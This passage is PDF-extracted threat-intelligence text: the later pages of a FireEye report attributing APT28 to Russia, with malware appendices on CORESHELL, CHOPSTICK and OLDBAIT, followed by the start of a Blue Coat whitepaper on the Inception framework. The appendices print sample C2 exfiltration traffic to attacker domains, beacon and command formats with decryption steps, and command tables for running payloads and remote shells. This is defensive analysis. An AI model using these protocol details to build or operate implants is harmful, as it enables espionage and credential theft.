                             capabilities as needed, as well as deploying                used one of four embedded sender email
                             additional capabilities at runtime. This allows the         addresses (@mia.gov.ge) to send files via
                             developers to make targeted implants, including             email to another email address on the same
                             only the capabilities and protocols necessary for a         mail server. All information required for the
                             specific environment. Such a modular framework              email was hardcoded in the backdoor.
                             suggests the group has had an organized               3.
   Local copying to defeat closed networks.
                             development effort since as early as 2007. A                One variant of CHOPSTICK focuses on
                             formal development environment, in which code is            apparent air gap / closed network capabilities
                             versioned and well-organized, would almost                  by routing messages between local
                             certainly be required to track and define the               directories, the registry and USB drives.
                             various modules that can be included in the
                             backdoor at compile time.
24 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APT28 MALWARE
INDICATES RUSSIAN
SPEAKERS IN A
RUSSIAN TIME ZONE
                             D
                                      uring our research into APT28
s malware,                            interface items in a specific language.25 Non-default
                                      we noted two details consistent across                              language settings packaged with PE resources are
                                      malware samples. The first was that                                 dependent on the developer
s build environment.
                             APT28 had consistently compiled Russian language                             Each PE resource includes a 
locale
 identifier with
                             settings into their malware. The second was that                             a language ID 
composed of a primary language
                             malware compile times from 2007 to 2014                                      identifier indicating the language and a sublanguage
                             corresponded to normal business hours in the UTC                             identifier indicating the country/region.
                             + 4 time zone, which includes major Russian cities
                             such as Moscow and St. Petersburg.                                           At the time of the writing of this paper, we had
                                                                                                          identified 103 malware samples that were both
                             Use of Russian and English Language                                          attributed to APT28 and contained PE resources.
                             Settings in PE Resources                                                     Table 5 shows the locale identifiers27 with
                             PE resources include language information that                               associated language and country/region for
                             can be helpful if a developer wants to show user                             these samples.
 Table 5: Locale and language identifiers associated with APT28 malware
                                                                                                                                                   Number of APT28
 Locale ID
               Primary language                                                            Country/Region
                                                                                                                                                   samples
 0x0419                   Russian (ru)                                                                Russia (RU)                                  59
 0x0409                   English (en)                                                                United States (US)                           27
 0x0000 or 0x0800         Neutral locale / System default locale language                             Neutral                                      16
                          English (en)                                                                United Kingdom (GB)                          1
 0x0809
                             25
                               Microsoft Developer Network 
 Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx
                                Microsoft Developer Network 
 Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx
                             26, 27
25 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                               The samples with Russian language settings were           with Russian language settings at least some of
                               compiled between late 2007 and late 2013, as              the time and made no effort to obscure this
                               depicted in Figure 9. This consistency over a             detail. Overall, the locale IDs suggest that
                               long timeframe suggests that the developers of            APT28 developers can operate in both Russian
                               APT28 malware were using a build environment              and English.
Figure 9: Number of APT28 samples with Russian language settings by compile month
 2007              December
 2008              March
                   May
                   August
 2009              February
                   May
                   September
 2010              February
                   March
                   August
                   September
                   October
                   November
                   December
 2011              April
                   June
                   September
                   December
 2012              April
                   May
                   June
                   July
                   October
                   December
 2013              January
                   July
                   August
                   October
                   November
                   December
                                  0
        1
        2
       3
        4
         5
        6
       7
        8
       9
26 fireeye.com
  APT 28: A Window into Russia
s Cyber Espionage Operations?
  Compile Times Align with Working
  Hours in Moscow and St. Petersburg
   Of the 140 malware samples that we have
  attributed to APT28 so far, over 89% were
  compiled between 0400 and 1400 UTC time, as
  depicted in Figure 10. Over 96% were compiled
  between Monday and Friday. This parallels the
  working hours in UTC+0400 (that is, compile
  times begin about 8AM and end about 6PM in this
  time zone). This time zone includes major Russian
  cities such as Moscow and St. Petersburg.
                                                                    13:00                  14:00              15:00              16:00
  Figure 10: Compile Times of APT28 malware in UTC Time
            20
            18
                                                                                                                  Moscow business hours
            16
            14
FREQUENCY
            12
            10
            8
            6
            4
            2
                 0   1
   2   3
   4   5   6    7     8    9   10    11     12   13   14     15    16   17   18   19   20   21   22      23   24
                                                               TIME OF DAY (UTC)
  27 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
CONCLUSION
We started researching APT28 based on activity               APT28
s characteristics
their targeting, malware,
we observed on our clients
 networks, similar to             language, and working hours
have led us to
other targeted threat groups we have identified              conclude that we are tracking a focused, long-
over time. We assess that APT28 is most likely               standing espionage effort. Given the available
sponsored by the Russian government. We                      data, we assess that APT28
s work is sponsored
summarize our key observations about APT28 in                by the Russian government.
Figure 11 below.
Figure 11: Summary of key observations about APT28
 MALWARE
 Evolves and Maintains Tools for Continued, Long-Term Use
 Uses malware with flexible and lasting platforms
 Constantly evolves malware samples for continued use
 Malware is tailored to specific victims
 environments, and is designed to hamper reverse engineering efforts
 Development in a formal code development environment
 Various Data Theft Techniques
 Backdoors using HTTP protocol
 Backdoors using victim mail server
 Local copying to defeat closed/air gapped networks
 TARGETING
 Georgia and the Caucasus
 Ministry of Internal Affairs
 Ministry of Defense
 Journalist writing on Caucasus issues
 Kavkaz Center
 Eastern European Governments & Militaries
 Polish Government
 Hungarian Government
 Ministry of Foreign Affairs in Eastern Europe
 Baltic Host exercises
 Security-related Organizations
 NATO
 OSCE
 Defense attaches
 Defense events and exhibitions
 RUSSIAN ATTRIBUTES
 Russian Language Indicators
 Consistent use of Russian language in malware over a period of six years
 Lure to journalist writing on Caucasus issues suggests APT28 understands both Russian and English
 Malware Compile Times Correspond to Work Day in Moscow
s Time Zone
 Consistent among APT28 samples with compile times from 2007 to 2014
 The compile times align with the standard workday in the UTC + 4 time zone which includes major Russian cities such
    as Moscow and St. Petersburg
28 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APPENDIX A:
DISTINGUISHING
THREAT GROUPS
                             We use the term 
threat group
 to refer to actors       Threat actors leave behind various forensic
                             who work together to target and penetrate               details. They may send spear phishing emails from
                             networks of interest. These individuals may share       a specific IP address or email address. Their emails
                             the same set of tasks, coordinate targets, and          may contain certain patterns; files have specific
                             share tools and methodology. They work together         names, MD5 hashes, timestamps, custom
                             to gain access to their targets and steal data.         functions, and encryption algorithms. Their
                                                                                     backdoors may have command and control IP
                             The art of attributing disparate intrusion activities   addresses or domain names embedded. These are
                             to the same threat group is not always simple.          just a few examples of the myriad of forensic
                             Different groups may use similar intrusion              details that we consider when distinguishing one
                             methodologies and common tools, particularly            threat group from another.
                             those that are widely available on the Internet,
                             such as pwdump, HTran, or Gh0st RAT. There may          At the most basic level, we say that two intrusion
                             be overlaps between groups caused by the sharing        events are attributed to the same group when we
                             of malware or exploits they have authored, or           have collected enough indicators to show beyond
                             even the sharing of personnel. Individual threat        a reasonable doubt that the same actor or group
                             actors may move between groups either                   of actors were involved. We track all of the
                             temporarily or permanently. A threat actor may          indicators and significant linkages associated with
                             also be a private citizen who is hired by multiple      identified threat groups in a proprietary database
                             groups. Multiple groups, on occasion, compromise        that comprises millions of nodes and linkages
                             the same target within the same timeframe.              between them. In this way, we can always go back
                                                                                     and answer 
 we associated cyber threat
                             Distinguishing one threat group from another is         activity with a particular group.
                             possible with enough information, analytical
                             experience, and tools to piece it all together. We
                             can analyze multiple incidents and tell by the
                             evidence left behind that a given incident was the
                             result of one threat group and not another.
29 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APPENDIX B:
TIMELINE OF
APT28 LURES
 YEAR LURE TOPIC                                                                                            MALWARE
 2010      Iran
s work with an international organization (internal document)                               SOURFACE
                                                                                                            SOURFACE,
 2011      File named 
military cooperation.doc
                                                                                                            OLDBAIT
 2011      Georgian language IT document for Ministry of Internal Affairs (internal document)               SOURFACE
           
USB Disk Security is the best software to block threats that can damage your PC or compromise
 2011                                                                                                       SOURFACE
           your personal information via USB storage.
 2012      Food security in Africa (
Food and nutrition crisis reaches peak but good forecast for 2013
)    SOURFACE
 2012      
IDF Soldier Killed and another injured in a Terror Attack
                                      SOURFACE
 2012      
Echo Crisis Report
 on Portugal
s forest fires                                                  SOURFACE
 2012      
FBI to monitor Facebook, Twitter, Myspace
                                                      SOURFACE
 2012      Georgia (US state, not the country of Georgia) murder case uncovers terror plot                  SOURFACE
 2012      Military attaches in London (internal document)                                                  SOURFACE
                                                                                                            CHOPSTICK,
 2013      South Africa MFA document
                                                                                                            CORESHELL
 2013      John Shalikashvili (Georgian-Polish-American US General) Questionnaire                           CORESHELL
 2013      Asia Pacific Economic Cooperation Summit 2013 reporters (internal document)                      SOURFACE
                                                                                                            CHOPSTICK,
 2013      Defense Attaches in Turkey (internal document)
                                                                                                            CORESHELL
                                                                                                            CHOPSTICK,
 2013      Turkish Cypriot news about Syria chemical weapons
                                                                                                            CORESHELL
 2013      Georgian language document about drivers
 licenses (internal document)                           EVILTOSS
 2013      Apparent Reason Magazine-related lure sent to a journalist                                       CORESHELL
 2014      Mandarin language document, possibly related to a Chinese aviation group (non-public document)   CORESHELL
 2014      Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack                 CORESHELL
30 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APPENDIX C:
SOURFACE/CORESHELL
                              SOURFACE is a downloader that obtains a second        two payloads. Messages are sent using HTTP
                              stage backdoor from a C2 server. Over time the        POST requests whose bodies contain encrypted
                              downloader has evolved and the newer versions,        and Base64 encoded data. The encryption
                              usually compiled with the DLL name 
coreshell.dll
,   algorithm is a custom stream cipher using a
                              are distinct enough from the older versions that      six-byte key. Commands from the controller to the
                              we refer to it as SOURFACE/CORESHELL or               CORESHELL implant are encrypted using another
                              simply CORESHELL. This appendix focuses on            stream cipher but this time using an eight-byte
                              these newer versions.                                 key. CORESHELL has used the same user agent
                                                                                    string (
MSIE 8.0
) that SOURFACE previously
                              CORESHELL uses two threads to communicate             used, but in more recent samples CORESHELL
                              with its C2 server. The first thread sends beacons    uses the default Internet Explorer user agent
                              that contain the process listing of the               string obtained from the system. Figure 11 shows
                              compromised host. The second thread is                an example POST request.
                              responsible for downloading and executing stage
                                Figure 11: Example CORESHELL POST request
                                POST /check/ HTTP/1.1
                                User-Agent: MSIE 8.0
                                Host: adawareblock.com
                                Content-Length: 58
                                Cache-Control: no-cache
                                zXeuYq+sq2m1a5HcqyC5Zd6yrC2WNYL989WCHse9qO6c7powrOUh5KY=
31 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             When Base64 decoded, the POST content looks like this:
                             00000000 cd 77 ae 62 af ac ab 69 b5 6b 91 dc ab 20 b9 65 .w.b...i.k... .e
                             00000010 de b2 ac 2d 96 35 82 fd f3 d5 82 1e c7 bd a8 ee ...-.5..........
                             00000020 9c ee 9a 30 ac e5 21 e4 a6 ...0..!..
                             The key used to encrypt the message is six bytes long and is appended to the end of the message. In this is
                             example the key would be: 30 ac e5 21 e4 a6. When the message is decrypted, the resulting plaintext is:
                             00000000 00 72 68 64 6e 7a 78 64 66 6d 46 36 66 35 61 68 .rhdnzxdfmF6f5ah
                             00000010 34 78 67 30 34 30 33 30 35 30 31 1a 00 00 00 23 4xg04030501....#
                             00000020 00 00 00 ...
                             The following table contains a breakdown of each of the field
s C2 message.
 Table 6: Example CORESHELL beacon structure
 Offset
      Value                    Description
 00           00                       Command byte:
                                       0 - Command request
                                       1 - Process listing
 01           
rhdn
                   Unknown - Potentially a campaign identifier. Values seen so far: 
rhze
rhdn
 and 
mtfs
 05           
zxdfmF6f5ah4xg
         Hostname of compromised system
 13           
0403
                   Unknown - Potentially a version number. This number is hardcoded within the implant.
 17           
                     OS Major version
 19           
                     OS Minor version
 1B           0x0000001a               Header length minus the command byte (LE DWORD)
 1F           0x00000023               Length of the entire message (LE DWORD)
32 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             Commands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST
                             requests. The command is identified by the NULL terminated UNICODE string 
 (O\x00\K\x00\x00\
                             x00). The command is Base64 encoded and immediately follows the 
 string. Figure 12 shows a
                             sample CORESHELL command:
                                Figure 12: Example CORESHELL controller response
                                HTTP/1.1 200 OK
                                Content-Type: text/html; charset=utf-8
                                Content-Length: 58
                                O.K...AQAAAKqqAQEBAQEBAQEVzPMEUUIzQtND8kOSRLVEVUV0RRRGN0bX
                             The Base64 decoded string is:
                             00000000 01 00 00 00 AA AA 01 01 01 01 01 01 01 01 10 41 ........ .......A
                             00000010 70 41 10 42 33 42 D3 43 F2 43 92 44 B5 44 55 45 pA.B3B.C .C.D.DUE
                             00000020 74 45 14 46 37 46 D7 tE.F7F.
                             The following table contains a description of each field in the command message:
                               Table 7: CORESHELL C2 message structure
                               Offset
      Value                        Description
                               00           0x00000001                   Constant value, must be set to 1 (LE DWORD)
                               04           AA AA                        Unknown - not referenced
                               06           01 01 01 01 01 01 01 01      Encryption key (8 bytes)
                               0E           10 41 70 41 10 42 33...      Encrypted command
33 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             When the above command 
10 41 70 41 10 42 33
 is decrypted using the key 
01 01 01 01 01
                             01 01 01
 the following command message is produced:
                             00000000 04 CC C2 04 00 42 42 42 42 43 43 43 43 44 44 44 .....BBBBCCCCDDD
                             00000010 44 45 45 45 45 46 46 46 46                      DEEEEFFFF
                             The implant supports the following four command identifiers from the controller as seen in Table 8. The
                             first byte of the command message specifies the command type and is immediately followed by the PE or
                             shellcode to be executed. In this example the command byte is 04 indicating the following bytes are
                             shellcode. If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would
                             be written to disk and executed.
 Table 8: CORESHELL commands
 Command ID           Description
 01                   Save command data as %LOCALAPPDATA%\svchost.exe and execute using CreateProcess.
 02                   Save command data as %LOCALAPPDATA%\conhost.dll and execute using 
rundll32.exe \
 03                   Save command data as %LOCALAPPDATA%\conhost.dll and execute using LoadLibrary.
 04                   Command data is a shell code and is executed using CreateThread.
34 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APPENDIX D:
CHOPSTICK
                              CHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++. This
                              framework allows for a diverse set of capabilities across malware variants sharing a common code base.
                              CHOPSTICK may communicate with external servers using SMTP or HTTP. This appendix documents
                              variants using HTTP communications.
                              The first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key
                              HKU\S-1-5-19_Classes\Software\Microsoft\MediaPlayer\{E6696105-E63E-4EF1-939E-
                              15DDD83B669A}\chnnl. The user HKU\S-1-5-19 corresponds to the LOCAL_SERVICE account SID.
                              The configuration block is encrypted using RC4 encryption. The key is a combination of a 50-byte static
                              key and a four-byte salt value randomly generated at runtime. The static key is derived from opcodes in
                              the backdoor.
                              CHOPSTICK collects detailed information from the host including the Windows version, CPU
                              architecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows
                              Vista and above and Internet Explorer settings. It also tests for the installation of specific security
                              products (Table 9) and applications (Table 10).
                              Table 9: Endpoint security products detected by CHOPSTICK
                              Service Name
                                        Security Product
                              Acssrv                                               Agnitum Client Security
                              AVP                                                  Kaspersky
                              SepMasterService                                     Symantec
                              McAfeeService                                        McAfee
                              AntiVirService                                       Avira
                              Ekrn                                                 ESET
                              DrWebAVService                                       Dr. Web Enterprise Security
                              MBAMService                                          Malwarebytes Anti-Malware
35 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
 Table 10: Applications detected by CHOPSTICK
 Process Name
                                               Application
 firefox.exe                                                 Mozilla Firefox
 iexplore.exe                                                Internet Explorer
 outlook.exe                                                 Microsoft Outlook
 opera.exe                                                   Opera Browser
 bat.exe                                                     Unknown
 msimn.exe                                                   Outlook Express
 vpngui.exe                                                  Cisco Anyconnect VPN client
 ipseca.exe                                                  IPsec VPN client
 ipsecc.exe                                                  IPsec VPN client
 openvpn.exe                                                 OpenVPN client
 openssl.exe                                                 OpenSSL
 openvpn-gui-1.0.3.exe                                       OpenVPN client
 msmsgs.exe                                                  Microsoft Messenger
 wuauclt.exe                                                 Windows Update
 chrome.exe                                                  Google Chrome Browser
 thebat.exe                                                  The Bat Secure Email Client
 skype.exe                                                   Skype Messenger
36 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             After collecting host information, CHOPSTICK creates a hidden file that may be named
                             %ALLUSERSPROFILE%\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the
                             name 
check_mes_v5555
.28 Its usage of a Windows mailslot would potentially allow external binaries to
                             write data to the 
check_mes_v5555
 mailslot, possibly allowing CHOPSTICK to encrypt and store
                             output from other malware. It creates a thread that records user activity on the host, capturing desktop
                             screenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window
                             contents (text, context menus, etc.). User activity is captured once every 500 milliseconds and logged in
                             an HTML-like format. The thread writes user activity log messages to the 
check_mes_v5555
 mailslot in
                             plain text. CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the
                             encrypted message in an edg6EF885E2.tmp temporary file. The RC4 encryption used here also uses a 50-
                             byte static key plus four-byte random salt value.
                             After approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2
                             servers over HTTP. After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2.
                             tmp to the C2 server using HTTP POST requests. It does not wait for a response from the server to begin
                             uploading. Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file. Figure 13
                             below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp.
                                  Figure 13: Sample CHOPSTICK v2 HTTP POST
                                  POST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=n-
                                  B9onK2KCi HTTP/1.1
                                  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8
                                  Accept-Language: en-us,en;q=0.5
                                  Accept-Encoding: gzip, deflate
                                  User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101
                                  Firefox/20.0
                                  Host: windows-updater.com
                                  Content-Length: 77
                                  Cache-Control: no-cache
                                  1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==
                             28
                               A mailslot is a Windows inter-process communication (IPC) mechanism similar to a named pipe, but is designed for one-way communications between
                               processes and can also be used across the network.
37 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             CHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes 
 and 
 for 
 and
                             
, respectively. Each HTTP request contains multiple Base64 encoded URL parameters, however only
                             one parameter contains information encoded by the malware (
) and the rest of the URL parameters
                             appear to be randomly generated per request.
                              CHOPSTICK encrypts an 11-byte sequence in the 
 parameter. The purpose of this parameter
                             appears to be to uniquely identify the particular instance of the backdoor to the C2 server. The Base64
                             encoded text of this parameter begins with a number of randomly generated alphabetical characters
                             presumably intended to prevent people from Base64 decoding the whole string without some knowledge
                             of how the malware family works. The first four bytes of the message are an XOR key for the remainder of
                             the data. Once decrypted using the XOR key, an 11-byte sequence is revealed. The first seven bytes are
                             static, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique.
                             The message body of the POST request is also Base64 encoded. This encoded string is also prefixed with
                             random characters designed to break the output of a Base64 decode operation on the entire string. The
                             first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence
                             stored in the 
 parameter as described above. Decrypting these bytes yields another static seven-byte
                             sequence, followed by four unique bytes. The remainder of the message body consists of the RC4
                             encrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp.
                             After uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using
                             HTTP GET requests. The malware contains code which allows it to load or memory-map external modules
                             that export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,
                             IsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,
                             and TakeMessage.
38 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             Modularity
                             CHOPSTICK backdoors are compiled within a modularized development framework. This means that
                             two separate CHOPSTICK backdoors may contain vastly different functionality, depending on which
                             modules were included at compile time. The modules that are included in an instance of CHOPSTICK
                             may be reported to the C2 server as part of POST messages. Figure 14 includes an example from a
                             CHOPSTICK v1 variant:
                                Figure 14: Sample CHOPSTICK v1 HTTP POST including module identification
                                POST /webhp?rel=psy&hl=7&ai=d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP-PVsYh1lVAXpLhIebB4=
                                HTTP/1.1
                                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                                Accept-Language: en-us,en;q=0.5
                                Accept-Encoding: gzip, deflate
                                User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101
                                Firefox/20.0
                                Host: adobeincorp.com
                                Content-Length: 71
                                Cache-Control: no-cache
                                d2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU=
39 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             To decode the POST content, the first step is to remove characters from the Base64 string (the number of
                             characters to remove may vary between different communication channels). In the example from Figure
                             14, the number of characters removed is seven. Once these characters are removed the decoded (but
                             still encrypted) text looks like this:
                             00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..
..3.^@$.1.@S
                             00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/
                             00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5
                             The first two words (
72 11
 and 
fd 22
) are checksums that are used to validate the message. The next 4
                             bytes 
f8 dc 33 9e
 are a salt value that is appended to the end of an RC4 key. Once decrypted, the
                             message looks like the following:
                             00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r..
..3.V4MGNxZW
                             00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<.
                             00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 .....#..#..#..#
                             The strings 
V4MGNxZWlvcmhjOG9yZQ
 and 
=<<\xee
 are hardcoded in the implant. The module
                             information starts at offset 0x20 with the string 
01 00 00
 and is formatted as follows:
                               Table 11: Example CHOPSTICK v1 message format
                               Offset
      Value                                   Description
                               00           0x0001                                  Message from the AgentKernel v1
                               02           00                                      Command ID
                               03           01 00 23 01 10 23 01 11 23 01 13 23     List of modules included in the implant
                                                                                    separated by a 
 character
40 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             The modules included in this CHOPSTICK v1 implant are:
 Table 12: Example CHOPSTICK v1 module list
 Module ID         Internal Module Name            Description
 0x0001            AgentKernel                     Kernel, probably version 1. Handles communication between modules and C2
                                                   tunnels.
 0x1001            modKey                          Logs keystrokes and takes screen captures.
 0x1101            modFS                           Facilitates file system access, such as directory browsing along with reading,
                                                   deleting and opening files.
 0x1301            modProcRet                      Remote command shell access.
                              Our determination of a CHOPSTICK 
 versus 
 is based on the self-identification of the kernel ID
                              and associated modules. Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules
                              in an example CHOPSTICK v2 variant in Table 13:
 Table 13: Example CHOPSTICK v2 module list
 Module ID         Internal Module Name            Description
 0x0002            kernel                          Kernel, probably version 2. Handles communication between modules and C2
                                                   tunnels.
 0x1002                                            Logs keystrokes and takes screen captures.
 0x1102                                            Facilitates filesystem access, such as directory browsing along with reading,
                                                   deleting and opening files.
 0x1302                                            Remote command shell access.
 0x1602                                            Load additional DLLs.
41 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             The kernel IDs 0x0001 and 0x0002 indicate different versions. The corresponding modules in each
                             backdoor also are consistently identified with 0x01 and 0x02, respectively, in the second byte. In both
                             variants the modules with keystroke log, file system access, and command shell capabilities have the
                             consistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte. This suggests that the first byte
                             in the module ID identifies the module type whereas the second byte identifies the kernel version.
                             The kernel sends commands to each module using its module ID. The commands that each module
                             understands are likely consistent from build to build. Table 14 and Table 15 show examples of commands
                             that each module understands.
                               Table 14: Commands understood by modFS (0x1101) module
                               Command ID
             Description         Example
                               01                      Find file           \x01\x11\x01Directory&file&[01]
                               02                      Read file           \x01\x11\x02Directory&file&[01]
                               03                      Write file          \x01\x11\x03Directory&file&[Contents]
                               04                      Delete file         \x01\x11\x04Directory&file&[01]
                               05                      Execute file        \x01\x11\x05Directory&file&[01]
                               Table 15: Commands understood by modProcRet (0x1301) module
                               Command ID
             Description         Example
                               00                      CMD.exe output      \x01\x13\x00[Output]
                               01                      CMD.exe start       \x01\x13\x01
                               02                      CMD.exe exit        \x01\x13\x02
                               11                      CMD.exe input       \x01\x13\x11[Input]
42 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APPENDIX E:
OLDBAIT
                             OLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\Application Data\
                             Microsoft\MediaPlayer\updatewindws.exe. There is a missing space in the MediaPlayer directory and
                             the filename is missing the 
 character. Both the internal strings and logic are obfuscated and are
                             unpacked at startup. Credentials for the following applications are collected:
                             
     Internet Explorer
                             
     Mozilla Firefox
                             
     Eudora
                             
     The Bat! (an email client made by a Moldovan company)
                             
     Becky! (an email client made by a Japanese company)
                             Both email and HTTP can be used to send out the collected credentials. Sample HTTP traffic is
                             displayed in Figure 15.
                                  Figure 15: Example OLDBAIT HTTP traffic
                                  POST /index.php HTTP/1.0
                                  Accept: text/html
                                  Accept-Language: en-us
                                  Content-Type: application/x-www-form-urlencoded
                                  Content-Length: 6482
                                  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
                                  Host: windous.kz
                                  Connection: Keep-Alive
                                  Pragma: no-cache
                                  prefs=C789Cu0Zacq7acr0D7LUawy6CY4REIaZBciWc6yVCN--cut--
43 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                Figure 16: Example OLDBAIT SMTP traffic
                                From: lisa.cuddy@wind0ws.kz
                                To: dr.house@wind0ws.kz
                                Subject: photo(9a3d8ea4-test)
                                Date: Tue, 23 Sep 2014 15:42:56 -0500
                                MIME-Version: 1.0
                                Content-Type: text/plain;
                                
charset=
us-ascii
                                Content-Transfer-Encoding: 7bit
                                X-Priority: 3
                                X-MSMail-Priority: Normal
                                X-Mailer: Microsoft Outlook Express 6.00.2900.2670
                                X-MimeOLE: Produced By Microsoft MimeOLE v6.00.2900.2670
                                X-Spam: Not detected
                                ===STARTPOINT===
                                qVV5KyHocV3FkUeENvu9LnVIlRB0YTa7xhoTwhRlIBBI7gRzVxikQXDRkdy4vGt1WfBtg9Utzbny
                                Uh+usXJHZ9Esecqq0UKg5Ul1O2E2OiyBTnGDPdP00UMRx/E+2it/10wQyH/epo8zuLnCuxPe7B+K
                                --cut---
                                hU+MWBLP+7h5ZojN
                                ===ENDPOINT===
                             OLDBAIT handles APIs very similarly to SOURFACE and EVILTOSS. There is a setup routine that loads
                             the imports into a table and all API calls reference an index to this table. In SOURFACE and EVILTOSS the
                             table is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is
                             passed between functions.
44 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
FireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com
 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc.
All other brands, products, or service names are or may be trademarks or service marks of
their respective owners. SP.APT28.EN-US.102014
45 fireeye.com
Whitepaper:
The Inception Framework:
Cloud-hosted APT
By Snorre Fagerland and Waylon Grange
Blue Coat Systems, Inc
                                        1
Executive summary
Blue Coat researchers have uncovered a previously-undocumented, highly
automated, and extremely sophisticated framework for performing targeted
attacks. The framework is notable for a number of reasons, including (but not
limited to) its use of a cloud-based infrastructure for command-and-control and its
use of the WebDAV protocol to send instructions and receive exfiltrated
information from compromised systems.
Initial malware components were embedded in Rich Text Format (RTF) files.
Exploitation of vulnerabilities in this file format is leveraged to gain remote access
to victim
s computers.
The framework, thus far, has been using the services of a cloud service provider
based in Sweden, CloudMe.com, for its main command-and-control
infrastructure. Malware payloads designed for a wide array of potential devices,
including home routers and mobile devices running iOS, BlackBerryOS or
Android, were also recovered during the course of our research.
The framework is designed in such a way that all post-infection communication
(i.e. target surveying, configuration updates, malware updates, and data
exfiltration) can be performed via the cloud service. The malware components of
this framework follow a plugin model, where new malware rely on other,
previously delivered malware components to interact with the framework.
Initial attacks were largely focused on Russia and a few other Eastern European
countries. However, we have later seen that attackers are interested in targets all
over the globe.
The framework is itself target-agnostic, and seems highly automated.
The operational security exhibited by the attackers is very good - among the best
we have seen. Most interaction between attackers and their infrastructure is
performed via a convoluted network of router proxies and rented hosts.
Although the attackers have left a few clues, we have been unable to provide
attribution with any degree of accuracy.
                                                                                  2
Introduction
The use of software vulnerabilities in order to execute malicious software on
unsuspecting users
 computers is an important parameter to monitor. This
method of attack is not only known to have a considerable success rate, it is also
often deployed by resourceful attackers and, as such, marks a threat worth
paying attention to.
The use of exploits in document formats like PDF, DOC and RTF is in some
ways especially noteworthy. Documents are commonly exchanged via mail,
which make them perfect for email-borne targeted attacks; what is otherwise
known as spear phishing.
In March, 2014, Microsoft published information about a new vulnerability in Rich
Text Format (RTF). This vulnerability, named CVE-2014-1761 (Microsoft Word
RTF Object Confusion), had already been used effectively by attackers at the
time of the announcement. Two previous vulnerabilities in the RTF file format,
known as CVE-2010-3333 and CVE-2012-0158, had become, by that time,
mainstays of targeted attacks, so we tracked how attackers implemented this
new exploit with keen interest.
By late August, we identified a malware espionage operation that used both the
CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the
malicious payload, and which leveraged a single cloud service as the backbone
of its entire visible infrastructure.
When we examined the suspicious documents, it was discovered that they were
somewhat anomalous compared to the run-of-the-mill material. They turned out
to belong to a highly advanced and professional targeted attack framework,
which utilized a complex series of techniques to survey potential targets.
Due to the many levels of obfuscation and indirection, we named this the
